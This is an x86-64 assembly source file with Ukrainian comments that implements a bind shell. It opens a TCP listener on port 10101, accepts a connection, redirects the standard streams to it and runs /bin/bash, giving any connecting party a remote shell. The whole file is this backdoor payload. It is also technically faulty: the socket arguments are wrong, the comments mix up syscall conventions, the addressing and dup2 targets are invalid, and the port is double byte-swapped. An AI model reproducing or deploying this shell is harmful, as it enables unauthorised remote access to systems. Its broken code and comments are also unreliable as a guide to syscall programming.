.data
sin:
    .zero 16          # резервуємо місце для структури sockaddr_in

port:
    .word 0x7527      # htons(10101)

sockfd:
    .long 0           # оголошуємо змінну для сокету

fd:
    .long 0           # оголошуємо змінну для файлового дескриптору

bash:
    .asciz "/bin/bash" # шлях до програми /bin/bash

.text
.globl _start
_start:
    # Відкриття TCP-сокету
    mov $0x29, %eax      # syscall number for socket (socketcall)
    xor %edi, %edi       # clear edi register (socketcall subfunction for socket)
    xor %esi, %esi       # clear esi register (AF_INET)
    xor %edx, %edx       # clear edx register (IPPROTO_TCP)
    syscall

    mov %eax, sockfd     # зберігаємо результат в змінну sockfd

    # Заповнення структури sockaddr_in
    mov $AF_INET, %ax    # sin_family = AF_INET
    mov %ax, sin(%rip)   # зберігаємо AF_INET у структурі
    mov port(%rip), %ax  # sin_port = htons(PORT)
    xchg %al, %ah        # htons(), AH ⇔ AL
    mov %ax, 2(sin)      # зберігаємо htons(PORT) у структурі

    # Виклик bind()
    mov $0x31, %eax      # syscall number for bind (socketcall)
    mov sockfd(%rip), %edi # передаємо сокетний дескриптор у реєстр EDI
    lea sin(%rip), %rsi  # передаємо адресу структури sockaddr_in у реєстр RSI
    mov $16, %edx        # передаємо sizeof(struct sockaddr_in) у реєстр EDX
    syscall

    # Виклик listen()
    mov $0x32, %eax      # syscall number for listen (socketcall)
    mov sockfd(%rip), %edi # передаємо сокетний дескриптор у реєстр EDI
    mov $1, %esi         # передаємо 1 у реєстр ESI (кількість сеансів, які будуть дозволені)
    syscall

    # Виклик accept()
    mov $0x2b, %eax      # syscall number for accept (socketcall)
    mov sockfd(%rip), %edi # передаємо сокетний дескриптор у реєстр EDI
    xor %esi, %esi       # передаємо NULL у реєстр ESI
    xor %edx, %edx       # передаємо NULL у реєстр EDX
    syscall

    mov %eax, fd(%rip)   # зберігаємо результат у файловому дескрипторі fd

    # Перенаправлення стандартних потоків на сокет
    mov $0x21, %eax      # syscall number for dup2 (два рази)
    mov fd(%rip), %edi   # передаємо файловий дескриптор у реєстр EDI
    xor %esi, %esi       # передаємо stdin (0) у реєстр ESI
    syscall

    mov $0x21, %eax      # syscall number for dup2 (три рази)
    mov fd(%rip), %edi   # передаємо файловий дескриптор у реєстр EDI
    mov %edi, %esi       # передаємо stdout (1) у реєстр ESI
    syscall

    mov $0x21, %eax      # syscall number for dup2 (чотири рази)
    mov fd(%rip), %edi   # передаємо файловий дескриптор у реєстр EDI
    mov %edi, %esi       # передаємо stderr (2) у реєстр ESI
    syscall

    # Запуск програми /bin/bash
    mov $0x3b, %eax      # syscall number for execve
    lea bash(%rip), %rdi # передаємо адресу шляху до програми /bin/bash у реєстр RDI
    xor %rsi, %rsi       # передаємо NULL у реєстр RSI
    xor %rdx, %rdx       # передаємо NULL у реєстр RDX
    syscall

    # Вихід з програми
    xor %edi, %edi       # передаємо 0 у реєстр EDI (код виходу)
    mov $0x3c, %eax      # syscall number for exit
    syscall

